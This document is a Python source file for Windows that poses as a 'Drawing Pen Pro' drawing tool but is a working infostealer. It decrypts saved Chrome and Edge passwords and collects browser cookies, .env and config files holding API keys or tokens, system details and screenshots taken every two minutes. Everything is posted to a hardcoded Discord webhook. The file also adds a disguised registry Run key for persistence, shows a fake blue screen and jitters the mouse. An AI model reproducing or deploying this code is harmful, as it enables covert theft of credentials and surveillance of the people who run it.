import os
import sys
import subprocess
import ctypes
import io
import time
import json
import sqlite3
import shutil
import base64
import random
import threading
import tkinter as tk
from datetime import datetime
from threading import Thread
import tempfile
import winreg
import platform

# Don't hide console for debugging (comment this out later if you want)
# if sys.platform == 'win32':
#     try:
#         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
#     except:
#         pass

# Install required modules silently
def install_modules():
    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'cryptography', 'pynput']
    for module in modules:
        try:
            if module == 'pillow':
                __import__('PIL')
            elif module == 'browser_cookie3':
                __import__('browser_cookie3')
            else:
                __import__(module)
        except ImportError:
            print(f"Installing {module}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet', '--no-warn-script-location'], 
                         capture_output=True, shell=True)

# Run module installation
install_modules()

# Now import all required modules
import pyautogui
import requests
from PIL import Image, ImageDraw
import browser_cookie3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt
import sqlite3
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Controller as KeyboardController, Key
import tkinter as tk

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
SCREENSHOT_INTERVAL = 120  # 2 minutes = 120 seconds

mouse = MouseController()
keyboard = KeyboardController()

def create_drawing_pen_gui():
    """Create a fake drawing pen GUI that looks like a tool"""
    try:
        root = tk.Tk()
        root.title("Drawing Tool")
        root.geometry("300x400")
        root.attributes('-topmost', True)
        root.attributes('-alpha', 0.9)
        
        # Random position on screen
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = random.randint(0, screen_width - 300)
        y = random.randint(0, screen_height - 400)
        root.geometry(f"300x400+{x}+{y}")
        
        # Fake drawing interface
        tk.Label(root, text="🖌️ Drawing Pen Pro", font=("Arial", 16, "bold")).pack(pady=10)
        tk.Label(root, text="Pen Size:", font=("Arial", 10)).pack()
        pen_size = tk.Scale(root, from_=1, to=20, orient=tk.HORIZONTAL)
        pen_size.set(5)
        pen_size.pack()
        
        tk.Label(root, text="Color:", font=("Arial", 10)).pack()
        color_var = tk.StringVar(value="Black")
        colors = ["Black", "Red", "Blue", "Green", "Yellow"]
        color_menu = tk.OptionMenu(root, color_var, *colors)
        color_menu.pack()
        
        canvas = tk.Canvas(root, bg="white", width=250, height=200)
        canvas.pack(pady=10)
        
        def on_drag(event):
            x1, y1 = (event.x - 1), (event.y - 1)
            x2, y2 = (event.x + 1), (event.y + 1)
            canvas.create_oval(x1, y1, x2, y2, fill=color_var.get(), width=pen_size.get())
        
        canvas.bind("<B1-Motion>", on_drag)
        
        tk.Button(root, text="Clear", command=lambda: canvas.delete("all")).pack(pady=5)
        tk.Button(root, text="Save Drawing", command=root.destroy).pack()
        
        # Run GUI
        root.mainloop()
    except Exception as e:
        print(f"GUI Error: {e}")

def blue_screen_of_death():
    """Create fake BSOD effect"""
    try:
        # Create fullscreen blue window
        bsod = tk.Tk()
        bsod.attributes('-fullscreen', True)
        bsod.configure(bg='#0000AA')
        bsod.attributes('-topmost', True)
        
        # White text for BSOD
        text_frame = tk.Frame(bsod, bg='#0000AA')
        text_frame.pack(expand=True)
        
        sad_face = tk.Label(text_frame, text=":(", font=("Consolas", 72, "bold"), fg="white", bg='#0000AA')
        sad_face.pack(pady=50)
        
        error_text = """Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
        
Stop code: CRITICAL_PROCESS_DIED

What failed: DrawingPen.sys

For more information about this issue and possible fixes, visit https://windows.com/stopcode

If you call a support person, give them this info:
Stop code: CRITICAL_PROCESS_DIED
What failed: DrawingPen.sys"""
        
        error_label = tk.Label(text_frame, text=error_text, font=("Consolas", 14), fg="white", bg='#0000AA', justify=tk.LEFT)
        error_label.pack(pady=30)
        
        # Progress bar
        progress = tk.Canvas(text_frame, width=500, height=20, bg='#0000AA', highlightthickness=0)
        progress.pack(pady=20)
        progress.create_rectangle(0, 0, 0, 20, fill='white', tags='progress')
        
        def update_progress():
            for i in range(101):
                progress.coords('progress', 0, 0, (500 * i / 100), 20)
                text_frame.update()
                time.sleep(0.03)
            bsod.destroy()
        
        Thread(target=update_progress, daemon=True).start()
        bsod.mainloop()
    except Exception as e:
        print(f"BSOD Error: {e}")

def mouse_jitter():
    """Make mouse jitter randomly"""
    try:
        for _ in range(50):
            current_x, current_y = mouse.position
            jitter_x = current_x + random.randint(-5, 5)
            jitter_y = current_y + random.randint(-5, 5)
            mouse.position = (jitter_x, jitter_y)
            time.sleep(0.05)
    except Exception as e:
        print(f"Mouse Error: {e}")

def type_solo():
    """Type 'Solo' on screen"""
    try:
        time.sleep(0.5)
        keyboard.type('Solo')
        time.sleep(0.5)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
    except Exception as e:
        print(f"Type Error: {e}")

def get_chrome_passwords():
    """Extract saved passwords from Chrome"""
    passwords = []
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(chrome_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(chrome_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pass = row[2]
                
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_pass)[1].decode('utf-8')
                    passwords.append(f"Chrome: {url} | {username} | {password}")
                except:
                    passwords.append(f"Chrome: {url} | {username} | [ENCRYPTED]")
            conn.close()
            os.unlink(temp_db.name)
    except Exception as e:
        print(f"Chrome Error: {e}")
    return passwords

def get_firefox_passwords():
    """Extract saved passwords from Firefox"""
    passwords = []
    try:
        firefox_path = os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles'
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                logins_path = os.path.join(firefox_path, profile, 'logins.json')
                if os.path.exists(logins_path):
                    with open(logins_path, 'r', encoding='utf-8', errors='ignore') as f:
                        data = json.load(f)
                        for login in data.get('logins', []):
                            passwords.append(f"Firefox: {login.get('hostname', '')}")
    except Exception as e:
        print(f"Firefox Error: {e}")
    return passwords

def get_edge_passwords():
    """Extract saved passwords from Edge"""
    passwords = []
    try:
        edge_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        if os.path.exists(edge_path):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(edge_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                try:
                    password = win32crypt.CryptUnprotectData(row[2])[1].decode('utf-8')
                    passwords.append(f"Edge: {row[0]} | {row[1]} | {password}")
                except:
                    passwords.append(f"Edge: {row[0]} | {row[1]} | [ENCRYPTED]")
            conn.close()
            os.unlink(temp_db.name)
    except Exception as e:
        print(f"Edge Error: {e}")
    return passwords

def get_browser_cookies():
    """Extract cookies from all browsers"""
    cookies_data = []
    try:
        try:
            for cookie in browser_cookie3.chrome():
                cookies_data.append(f"Chrome: {cookie.domain} | {cookie.name}")
        except:
            pass
        
        try:
            for cookie in browser_cookie3.firefox():
                cookies_data.append(f"Firefox: {cookie.domain} | {cookie.name}")
        except:
            pass
        
        try:
            for cookie in browser_cookie3.edge():
                cookies_data.append(f"Edge: {cookie.domain} | {cookie.name}")
        except:
            pass
    except Exception as e:
        print(f"Cookie Error: {e}")
    return cookies_data[:100]

def get_api_keys():
    """Extract API keys from common locations"""
    api_keys = []
    common_locations = [
        os.path.expanduser('~') + '\\.env',
        os.path.expanduser('~') + '\\Desktop\\*.env',
        os.path.expanduser('~') + '\\Documents\\config.json',
    ]
    
    for location in common_locations:
        try:
            if '*' in location:
                import glob
                files = glob.glob(location)
                for file in files:
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if any(key in content.lower() for key in ['api_key', 'token', 'secret']):
                            api_keys.append(f"File: {file}\n{content[:200]}")
            elif os.path.exists(location):
                with open(location, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if any(key in content.lower() for key in ['api_key', 'token', 'secret']):
                        api_keys.append(f"File: {location}\n{content[:200]}")
        except:
            pass
    
    return api_keys

def get_system_info():
    """Collect system information"""
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = 'Unknown'
    
    return {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'user': os.getenv('USERNAME', 'Unknown'),
        'os': platform.system() + ' ' + platform.release(),
        'ip': ip
    }

def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
    """Send data to Discord webhook"""
    try:
        if is_file and file_bytes:
            files = {'file': (filename, file_bytes, 'image/jpeg')}
            response = requests.post(WEBHOOK_URL, files=files, timeout=30)
            print(f"[+] Sent screenshot: {filename} - Status: {response.status_code}")
            return True
        else:
            # Split long messages
            if len(content) > 1900:
                for i in range(0, len(content), 1900):
                    response = requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
            else:
                response = requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
            print(f"[+] Sent data - Status: {response.status_code}")
            return True
    except Exception as e:
        print(f"[-] Webhook Error: {e}")
        return False

def collect_and_send_credentials():
    """Collect all credentials and send to webhook"""
    print("\n[+] Collecting system information...")
    sys_info = get_system_info()
    
    message = f"**[SYSTEM SCAN - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
    message += f"💻 PC: {sys_info['computer']}\n"
    message += f"👤 User: {sys_info['user']}\n"
    message += f"🖥️ OS: {sys_info['os']}\n"
    message += f"🌐 IP: {sys_info['ip']}\n\n"
    
    print("[+] Collecting passwords...")
    message += "**🔑 BROWSER PASSWORDS:**\n"
    for pwd in get_chrome_passwords()[:10]:
        message += f"• {pwd}\n"
    
    print("[+] Collecting cookies...")
    message += "\n**🍪 COOKIES:**\n"
    for cookie in get_browser_cookies()[:10]:
        message += f"• {cookie}\n"
    
    print("[+] Collecting API keys...")
    message += "\n**🔐 API KEYS:**\n"
    for api in get_api_keys()[:5]:
        message += f"• {api}\n"
    
    print("[+] Sending to webhook...")
    send_to_webhook(message)

def screenshot_worker():
    """Take screenshot every 2 minutes"""
    print("[+] Screenshot worker started")
    while True:
        try:
            # Take screenshot
            screenshot = pyautogui.screenshot()
            
            # Compress
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=60)
            img_bytes.seek(0)
            
            # Send screenshot
            sys_info = get_system_info()
            filename = f"ss_{sys_info['computer']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            print(f"[+] Taking screenshot: {filename}")
            send_to_webhook(None, True, img_bytes.getvalue(), filename)
            
            # Effects
            Thread(target=mouse_jitter, daemon=True).start()
            Thread(target=type_solo, daemon=True).start()
            
            time.sleep(SCREENSHOT_INTERVAL)
            
        except Exception as e:
            print(f"[-] Screenshot error: {e}")
            time.sleep(5)

def add_to_startup():
    """Add to Windows startup registry"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsDrawingService", 0, winreg.REG_SZ, 
                            f'"{sys.executable}" "{script_path}"')
        print("[+] Added to Windows startup")
        return True
    except Exception as e:
        print(f"[-] Startup error: {e}")
        return False

def main():
    print("="*50)
    print("🖌️ DRAWING PEN PRO - STARTING")
    print("="*50)
    
    # Add to startup
    add_to_startup()
    
    # Wait for system to be ready
    time.sleep(3)
    
    # Send initial credentials
    collect_and_send_credentials()
    
    # Start drawing pen GUI
    print("[+] Starting Drawing GUI...")
    gui_thread = Thread(target=create_drawing_pen_gui, daemon=True)
    gui_thread.start()
    
    # Wait 30 seconds then show BSOD
    def show_bsod_delayed():
        print("[+] BSOD will appear in 30 seconds")
        time.sleep(30)
        blue_screen_of_death()
    
    bsod_thread = Thread(target=show_bsod_delayed, daemon=True)
    bsod_thread.start()
    
    # Start screenshot worker
    print("[+] Screenshot worker active (every 2 minutes)")
    print("[+] Press Ctrl+C to stop\n")
    
    try:
        screenshot_worker()
    except KeyboardInterrupt:
        print("\n[+] Stopping...")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[-] Fatal Error: {e}")
        print("\nPress Enter to exit...")
        input()
